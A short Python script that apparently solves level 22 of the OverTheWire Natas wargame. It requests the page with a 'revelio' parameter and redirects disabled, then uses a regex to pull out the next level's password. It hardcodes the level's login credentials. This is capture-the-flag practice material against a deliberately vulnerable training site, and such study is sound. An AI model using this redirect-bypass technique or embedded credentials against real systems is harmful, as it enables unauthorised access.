import requests
import re

URL = 'http://natas22.natas.labs.overthewire.org' + '?revelio=test'
AUTH = ('natas22', '91awVM9oDiUGm33JdzM7RVLBS8bz9n0s')

r = requests.get(url=URL, auth=AUTH, allow_redirects=False)

print('password', re.findall(r'Password: (.*?)</pre>', r.text))
